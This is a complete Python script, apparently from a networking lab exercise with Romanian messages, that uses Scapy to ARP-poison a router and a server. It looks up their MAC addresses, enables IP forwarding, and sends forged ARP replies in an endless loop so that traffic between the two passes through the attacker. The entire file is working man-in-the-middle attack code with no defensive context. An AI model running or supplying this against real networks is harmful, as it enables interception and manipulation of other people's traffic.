from scapy.all import *
import os
import time

ip_server="198.13.0.14"
ip_router="198.13.0.1"



def get_mac(ip):
    answered,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=10)
    for send,rec in answered:
        return rec[ARP].hwsrc
    return None

def arp_poison(gate_ip,gate_mac,target_ip,target_mac):
    while True:
        arp_gateway=ARP(op=2,pdst=gate_ip,hwdst=gate_mac,psrc=target_ip)
        send(arp_gateway)

        arp_target=ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gate_ip)
        send(arp_target)

        mac_middle="02:42:c6:0d:00:af"
        arp_gateway_mac=ARP(op=2,pdst=gate_ip,hwdst=gate_mac,hwsrc=mac_middle)
        send(arp_gateway_mac)

        arp_target_mac=ARP(op=2,pdst=target_ip,hwdst=target_mac,hwsrc=mac_middle)
        send(arp_target_mac)
        time.sleep(2)

gateway_mac=get_mac(ip_router)
os.system("sysctl -w net.ipv4.ip_forward=1")
if gateway_mac is None :
    print("Nu s-a gasit adresa routerului")
    sys.exit(0)
else :
    print("Mac router :"+gateway_mac)

target_mac=get_mac(ip_server)
if target_mac is None :
    print("Nu s-a gasit adresa serverului")
    sys.exit(0)
else:
    print("Mac server :"+target_mac)

arp_poison(ip_router,gateway_mac,ip_server,target_mac)

